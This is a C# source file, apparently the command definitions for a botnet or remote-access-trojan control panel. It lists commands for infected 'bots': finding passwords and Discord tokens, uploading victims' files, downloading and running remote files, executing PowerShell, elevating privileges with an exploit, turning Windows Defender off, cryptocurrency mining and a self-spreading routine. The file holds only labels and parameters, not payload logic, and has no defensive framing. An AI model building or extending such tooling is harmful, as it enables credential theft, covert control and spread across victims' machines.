using System.Collections.Generic;

namespace Panel
{

    public struct Param
    {
        public string Label;
        public string Type;
    }

    public class Command
    {
        public string FriendlyName;
        public bool CanStore = false;
        public Param[] Params = null;
    }

    public static class Commands
    {
        public static Dictionary<string, Command> Get = new Dictionary<string, Command>()
        {
            {"cmdAbort", new Command {FriendlyName="Abort Command", Params=new Param[1]{
                new Param {Label="Command ID", Type="Text"}
            }}},
            {"cmdBotInfo", new Command {FriendlyName="Bot Information"}},
            {"cmdRestart", new Command {FriendlyName="Restart Bot"}},
            {"cmdBlock", new Command {FriendlyName="Block Connection"}},
            {"cmdUninstall", new Command {FriendlyName="Uninstall Bot"}},
            {"cmdUpdate", new Command {FriendlyName="Update Bot", Params=new Param[1]{
                new Param {Label="URL", Type="Text"}
            }}},
            {"cmdCompleteInfo", new Command {FriendlyName="Complete Report"}},
            {"cmdSysInfo", new Command {FriendlyName="System Information"}},
            {"cmdSoftInfo", new Command {FriendlyName="Software Information"}},
            {"cmdPassInfo", new Command {FriendlyName="Find Passwords"}},
            {"cmdDiscordInfo", new Command {FriendlyName="Find Discord Token"}},
            {"cmdDownload", new Command {FriendlyName="Download File", Params=new Param[2]{
                new Param {Label="URL", Type="Text"},
                new Param {Label="Save as", Type="Text"}
            }}},
            {"cmdUpload", new Command {FriendlyName="Upload File", Params=new Param[1]{
                new Param {Label="Local file", Type="Text"}
            }}},
            {"cmdFolderList", new Command {FriendlyName="List Folders", Params=new Param[1]{
                new Param {Label="Local folder", Type="Text"}
            }}},
            {"cmdFileList", new Command {FriendlyName="List Files", Params=new Param[1]{
                new Param {Label="Local folder", Type="Text"}
            }}},
            {"cmdOpen", new Command {FriendlyName="Open File", Params=new Param[1]{
                new Param {Label="Local file", Type="Text"}
            }, CanStore=true}},
            {"cmdShutdown", new Command {FriendlyName="System Shutdown"}},
            {"cmdReboot", new Command {FriendlyName="Reboot System"}},
            {"cmdLock", new Command {FriendlyName="Lock System"}},
            {"cmdSleep", new Command {FriendlyName="Enter Sleep Mode"}},
            {"cmdWake", new Command {FriendlyName="Wake System"}},
            {"cmdExec", new Command {FriendlyName="Execute Local File", Params=new Param[3]{
                new Param {Label="Local file", Type="Text"},
                new Param {Label="Hide window", Type="Bool"},
                new Param {Label="Wait for termination", Type="Bool"}
            }, CanStore=true}},
            {"cmdRemoteExec", new Command {FriendlyName="Execute Remote File", Params=new Param[3]{
                new Param {Label="URL", Type="Text"},
                new Param {Label="Hide window", Type="Bool"},
                new Param {Label="Wait for termination", Type="Bool"}
            }, CanStore=true}},
            {"cmdCommand", new Command {FriendlyName="Execute Command", Params=new Param[1]{
                new Param {Label="PowerShell command", Type="TextBox"}
            }, CanStore=true}},
            {"cmdAskElevate", new Command {FriendlyName="Elevate as Untrusted", CanStore=true}},
            {"cmdDisguisedElevate", new Command {FriendlyName="Elevate as Trusted", CanStore=true}},
            {"cmdSilentElevate", new Command {FriendlyName="Elevate with Exploit", CanStore=true}},
            {"cmdDefenderOff", new Command {FriendlyName="Turn Windows Defender Off"}},
            {"cmdDefenderOn", new Command {FriendlyName="Turn Windows Defender On"}},
            {"cmdStartMining", new Command {FriendlyName="Start Mining", CanStore=true}},
            {"cmdQueryMining", new Command {FriendlyName="Query Miner Status"}},
            {"cmdStartSpreading", new Command {FriendlyName="Start Spreading Routine", CanStore=true}},
            {"cmdDisinfect", new Command {FriendlyName="Disinfect Shared Resources"}},
            {"cmdMessageBox", new Command {FriendlyName="Display Message Box", Params=new Param[3]{
                new Param {Label="Caption", Type="Text"},
                new Param {Label="Text", Type="TextBox"},
                new Param {Label="Critical", Type="Bool"}
            }, CanStore=true}}
        };
    }
}
